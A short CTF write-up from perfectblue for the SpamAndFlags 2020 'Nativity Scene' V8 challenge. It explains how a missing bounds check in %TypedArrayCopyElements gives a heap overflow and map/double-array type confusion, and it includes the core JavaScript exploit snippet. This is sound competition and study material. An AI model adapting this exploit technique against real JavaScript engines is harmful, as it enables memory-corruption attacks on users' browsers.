---
title: "Nativity Scene - SpamAndFlags 2020"
category: "pwn"
subcategory: "heap"
type: "writeup"
tags: ["pwn", "heap", "nativity", "scene", "binary-exploitation", "nativity-scene"]
summary: "In this challenge I abused heap overflow with %TypedArrayCopyElements that didn't check the bounds."
source:
  name: "perfectblue/ctf-writeups"
  url: "https://github.com/perfectblue/ctf-writeups/blob/db9b964bf35c210567ea508383e91a9c423adaee/2020/SpamAndFlags/Nativity%20Scene/README.md"
ctf:
  name: "SpamAndFlags"
  year: 2020
  challenge: "Nativity Scene"
---

## Source

- **CTF:** SpamAndFlags 2020
- **Challenge:** Nativity Scene
- **Repository:** [perfectblue/ctf-writeups](https://github.com/perfectblue/ctf-writeups)
- **File:** <https://github.com/perfectblue/ctf-writeups/blob/db9b964bf35c210567ea508383e91a9c423adaee/2020/SpamAndFlags/Nativity%20Scene/README.md>

---
In this challenge I abused heap overflow with `%TypedArrayCopyElements` that didn't check the bounds.

Luckily, during CONFIDENCE CTF i didn't notice you could use clean OOB write and decided to go with heap overflow to make confusion between map and array with doubles.
So once I confused the object, i just copied the exploit I used before ;)

The "meat" of the exploit is shown below:

```
var w = new Uint8Array(10);
var z = new Uint8Array(1000);

var sice_obj = {"a":0x100.smi2f(),"b":BigInt(0x13377331).i2f(),"c":BigInt(0x13377331).i2f(),"d":BigInt(0x13377331).i2f()}

z.fill(0x91,0,1000);
z[197] = 0x18; // two lower bytes dictate the type of the object (it's a map ptr)
z[196] = 0x91;
//%DebugPrint(sice_obj);


%TypedArrayCopyElements(w,z,198);
```

P.S fun fact, you could abuse another function  - `%TypedArraySet` for OOB if only it didn't have mismatched amount of arguments in declaration and in implementation
